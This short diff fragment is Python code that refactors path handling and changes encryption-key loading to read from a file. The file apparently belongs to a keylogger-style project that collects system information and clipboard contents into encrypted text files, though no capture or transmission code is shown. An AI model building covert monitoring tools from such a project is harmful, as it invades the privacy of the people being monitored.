@@ -36,11 +36,10 @@ system_information_e = "e_system_info.txt"
 clipboard_information_e = "e_clipboard.txt"
 
 
-file_path = os.getcwd()
-extend = "\\Project\\"
-file_merge = file_path + extend
+file_merge = os.path.join(os.getcwd(), "Project")
 
-key = generateKey.encryted_key
+with open("Cryptography/encryption_key.txt", "rb") as f:
+    key = f.read()
 
 count = 0
 keys = []
